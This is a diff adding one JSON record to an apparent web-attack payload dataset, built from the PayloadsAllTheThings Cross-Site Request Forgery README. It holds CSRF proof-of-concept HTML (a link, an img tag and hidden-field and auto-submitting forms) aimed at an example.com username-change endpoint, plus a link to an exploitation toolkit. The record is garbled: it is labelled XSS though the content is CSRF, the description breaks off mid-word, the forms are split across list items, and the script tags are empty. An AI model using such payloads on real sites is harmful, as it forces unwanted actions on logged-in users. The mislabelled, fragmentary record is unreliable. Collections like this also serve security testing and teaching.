@@ -1,0 +1,27 @@
+{
+  "id": "xss-c8c12f8caf2b",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Cross-Site Request Forgery\n\n> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interacti",
+  "payloads": [
+    "* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.",
+    "![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)",
+    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>",
+    "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">",
+    "<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+    "<input name=\"username\" type=\"hidden\" value=\"CSRFd\" />",
+    "<input type=\"submit\" value=\"Submit Request\" />",
+    "</form>",
+    "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+    "<input name=\"username\" type=\"hidden\" value=\"CSRFd\" />",
+    "<input type=\"submit\" value=\"Submit Request\" />",
+    "</form>",
+    "<script>",
+    "</script>",
+    "<script>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Cross-Site Request Forgery/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
